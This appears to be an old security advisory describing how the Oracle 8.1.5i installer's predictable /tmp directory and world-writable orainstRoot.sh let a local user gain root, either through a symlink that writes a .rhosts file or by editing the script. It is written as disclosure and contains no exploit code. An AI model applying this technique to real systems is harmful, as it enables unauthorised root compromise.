# A vulnerability exists in the installation program
# for Oracle 8.1.5i. The Oracle installation scripts
# will  create  a  directory  named /tmp/orainstall,
# owned  by  oracle:dba,  mode  711.  Inside of this
# directory  it will  create a  shell  script  named
# orainstRoot.sh, mode 777.  The installation script
# will then stop and  ask the  person installing  to
# run this script. The  installation  program at  no
# point attempts to determine if   the directory  or
# script  already  exist.  This  makes  it  possible
# to create a symbolic link from the  orainstRoot.sh
# file to elsewhere on  the file system.  This could
# be used  to  create a  .rhosts file, for instance,
# and gain access to the root account.  In addition,
# since the orainstRoot.sh file  is  mode 777, it is
# possible for any user on the  machine to edit this
# script to execute arbitrary  commands  when run by
# root. Again, this can result in the compromise  of
# the root account.
#
# It is not readily apparent what version of  Oracle
# this  does  and  does  not  affect. It  has   been
# confirmed on Oracle  8.1.5i,  on  the  Linux/Intel
# platform.  It is likely  that  this  vulnerability
# may  exists   in  other  versions,  and  on  other
# platforms.   If  you  have  any  information about
# this, please mail us at: vuldb@securityfocus.com.
